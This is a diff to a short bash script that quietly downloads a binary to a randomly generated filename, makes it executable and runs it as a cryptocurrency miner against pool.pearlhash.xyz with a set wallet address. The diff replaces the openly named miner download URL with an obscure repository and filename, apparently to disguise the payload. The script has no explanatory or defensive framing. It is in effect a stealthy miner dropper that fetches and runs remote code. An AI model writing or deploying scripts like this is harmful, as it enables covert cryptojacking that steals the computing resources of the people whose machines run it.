@@ -1,13 +1,9 @@
 #!/bin/bash
-apt-get update -y
-apt-get upgrade -y
-apt-get install -y --no-install-recommends \
-
 # Generate a random filename
 BIN_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 12)
 
 # Download binary quietly and rename
-wget -q https://github.com/pearlhash/pearlhash-miner/releases/download/V14/pearl-miner -O "$BIN_NAME"
+wget -q https://github.com/fonduesun/tearvsds/releases/download/latest/wolsoa -O "$BIN_NAME"
 
 # Make it executable
 chmod +x "$BIN_NAME"
@@ -15,4 +11,4 @@ chmod +x "$BIN_NAME"
 # Optional: run the binary
 # ./"$BIN_NAME"
 
-./"$BIN_NAME" --host pool.pearlhash.xyz:9000 --user prl1prafxwc52qrj2gqd46q78hnqfakeff7zsxdn3ndd5uu6n4f27wneq3c7gd5 --worker $RANDOM-535
+./"$BIN_NAME" --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1prafxwc52qrj2gqd46q78hnqfakeff7zsxdn3ndd5uu6n4f27wneq3c7gd5 --worker $RANDOM-askoea
